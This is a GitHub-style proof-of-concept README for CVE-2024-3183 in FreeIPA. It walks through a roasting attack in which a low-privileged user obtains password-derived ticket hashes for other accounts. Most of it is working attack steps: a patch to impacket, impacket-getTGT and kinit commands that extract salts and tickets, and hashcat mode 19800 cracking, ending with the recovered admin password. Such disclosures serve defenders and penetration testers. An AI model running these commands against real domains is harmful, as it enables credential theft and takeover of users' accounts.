# CVE-2024-3183-POC
POC for CVE-2024-3183 (FreeIPA Rosting)

Impact:
A low-privileged user can obtain a hash of the passwords of all domain users and perform offline brute force (kerberoasting).

Patch impacket-getTGT:
1) Add `decoder.decode.defaultErrorState = stGetValueDecoderByTag` to `impacket/krb5/kerberosv5.py`.
2) Enjoy!

## POC1:
1) Add `decoder.decode.defaultErrorState = stGetValueDecoderByTag` to `impacket/krb5/kerberosv5.py`.
2) You can use impacket-getTGT whith `-service` option and `-debug` option for get salt in one command.
`impacket-getTGT test.local/user -debug -service admin`

## POC2:
1) First, let's request a TGT ticket for an already compromised user "admin".
`kinit user`
![foto1](https://github.com/user-attachments/assets/c7935c7f-d978-4e34-b309-eba1c2d9c7db)
2) Secondly, we will find out the salt of the "admin" user:
`printf "%b" "0\n" | KRB5_TRACE=/dev/stdout kinit admin | grep salt`
![foto2](https://github.com/user-attachments/assets/32a7b926-ed49-4a4f-81b6-91e06a86c04a)
3) Get TGS for "admin":
`kvno admin`
![foto](https://github.com/user-attachments/assets/71f31595-ca1b-492d-8ef4-98071c11e85b)
![foto3](https://github.com/user-attachments/assets/6b4bcc3a-3b2d-4b5f-abf9-dd69853b844c)
5) Use python script (or hashcat mod 19800 with specific salt) for brute force TGS
![foto4](https://github.com/user-attachments/assets/6fb2983a-cd93-4858-8f87-93cde0a7c20e)

1 - TGS,
2 - SALT,
3 - Passwords.

5) Congratulations, we now have the user password “admin”.

## POC3:

1) You can use kinit for one move:
`kinit -S target user`

and you get TGT who encripted by target user key.


